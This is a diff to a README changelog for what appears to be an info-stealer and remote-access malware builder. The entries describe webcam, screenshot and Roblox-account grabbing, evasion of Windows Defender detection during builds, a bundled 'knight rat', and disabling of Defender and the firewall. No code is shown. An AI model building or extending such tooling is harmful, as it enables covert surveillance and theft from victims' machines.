@@ -106,6 +106,13 @@
 
 ## <a id="changelog"></a> Changelog
 ```
+[1.3] - 2023-07-17
+Force disabled unstable functions and added webcam grabbing
+
+- Disabled unstable functions and working on a hardfix
+- Added webcam grabbing option
+- Fixed wrong ordinary with roblox and screenshot grabbing in v8.pyw
+
 [1.2] - 2023-07-09
 Fixed the windows defender detection while building, added knight rat and disabling functions for windows defender and firewall
 
